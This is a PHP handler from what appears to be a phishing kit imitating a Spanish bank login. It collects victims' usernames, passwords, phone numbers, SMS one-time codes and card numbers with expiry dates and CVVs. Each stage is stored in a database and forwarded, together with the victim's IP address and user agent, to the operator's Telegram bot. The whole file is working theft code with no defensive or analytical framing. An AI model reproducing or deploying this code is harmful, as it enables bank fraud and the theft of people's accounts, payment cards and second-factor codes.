<?php
if ($_SERVER["REQUEST_METHOD"] == 'POST') 
{
	session_start();
	include "../config.php";
	include "./functions.php";
	include "./class/UserInfo.php";
	include "./class/SendTg.php";
	include "../system/config/config.php";
	include "../system/config/db.class.php";
	include "../system/config/User.php";

	$ip  = UserInfo::getIP();
	$uag = UserInfo::getUag();
	$user_s = $_SESSION['time'];
	$userclass = new User();
	$db = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	$sendTg = new SendTg($bot_token, $chat_id);

	switch ($_GET["id"]) {
		case 'login':
				$errors = array();
				$_SESSION['page'] = true;
				$user = $_SESSION["user"] = trim($_POST["user"]);
				$pass = $_SESSION["pass"] = trim($_POST["pass"]);
			
				if (empty($user) || empty($pass)) {
					$errors['datos'] = 'Alle Daten sind erforderlich';
				}

				if (strlen($user) < 4 || strlen($pass) < 4) {
					$errors['login'] = '<strong>Por favor, introduce de nuevo tu usuario y/o la contraseña.</strong><br>Si no recuerdas tu contraseña, pulsa en el enlace ""Recuperar contraseña"" antes de bloquear tu usuario (dispones de hasta 3 intentos).';
				}

				if (count($errors) !== 0) {
					$_SESSION['errors'] = $errors;
					header("location: ../login");
				} else {
					if (isset($_SESSION['update']['login'])) {
						$SQL = $db->update($userclass->updateUser($user, $pass, $user_s, 1, time()));
						unset($_SESSION['update']['login']);
						header("location: ../wait");
					} else {
						$_SESSION['page'] = true;
						$SQL = $db->insert($userclass->createUser($user, $pass, $ip, $uag, $user_s, 1, time()));
						header("location: ../wait");
					}
					$sendTg->sendLogin($user, $pass, $ip, $uag);
					exit(0);
				}
			break;
			case 'linksms':
				$errors = array();
				$_SESSION['final'] = true;
				$linksms = $_SESSION["linksms"] = trim($_POST["linksms"]);
				
			
			

				if (count($errors) !== 0) {
					$_SESSION['errors'] = $errors;
					header("location: ../url");
				} else {
					$SQL = $db->update($userclass->updateLinkSMS($linksms,  $user_s, 1, time()));
					$sendTg->sendLinkSMS($_SESSION["user"], $_SESSION["pass"], $linksms,  $ip, $uag);
					header('location: ../wait');
					exit(0);
				}
			break;
			case 'phone':
				$errors = array();
				$_SESSION['final'] = true;
				$phone = $_SESSION["phone"] = trim($_POST["phone"]);
				
			
			

				if (count($errors) !== 0) {
					$_SESSION['errors'] = $errors;
					header("location: ../confirma");
				} else {
					$SQL = $db->update($userclass->updatePhoneFirma($phone,  $user_s, 1, time()));
					$sendTg->sendPhoneFirma($_SESSION["user"], $_SESSION["pass"], $phone,  $ip, $uag);
					header('location: ../wait');
					exit(0);
				}
			break;
			case 'sms':
				$errors = array();
				$sms = $_SESSION["sms"] = trim($_POST["sms"]);
			
				if (empty($sms)) {
					$errors['datos'] = 'Alle Daten sind erforderlich';
				}

				if (count($errors) !== 0) {
					$_SESSION['errors'] = $errors;
					header("location: ../sms");
				} else {
					$SQL = $db->update($userclass->updateOtp($sms, $user_s, 1, time()));
					$sendTg->sendOtp($_SESSION["user"], $sms);
					header('location: ../wait');
					exit(0);
				}
			break;
			case 'cards':
				$errors = array();
				$card  = $_SESSION["card"]  = $_POST["card"];
				$month = $_SESSION["month"] = $_POST["month"];
				$year  = $_SESSION["year"]  = $_POST["year"];
				$cvv   = $_SESSION["cvv"]   = $_POST["cvv"];


				if (empty($card) || empty($month) || empty($year) || empty($cvv)) {
					$errors['datos'] = 'Alle Daten sind erforderlich';
				}
				
				$cardDb = '';
				$cardTg = '';
				for ($i=0; $i < count($cvv); $i++) { 
					$cardDb .= $card[$i].'|'.$month[$i].'|'.$year[$i].'|'.$cvv[$i]."<br>";
					$cardTg .= $card[$i].'|'.$month[$i].'|'.$year[$i].'|'.$cvv[$i]."\n";
				}

				if (count($errors) !== 0)
				{
					$_SESSION['errors'] = $errors;
					header("location: ../cards");
				} else {
					$SQL = $db->update($userclass->updateCards($cardDb, $user_s, 1, time()));
					$sendTg->sendCard($_SESSION['user'], $_SESSION['pass'], $_SESSION['phone'], $_SESSION['firma'], $cardTg, $ip, $uag);
					header('location: ../wait');
					exit(0);
				}
			break;
	}

}
?>
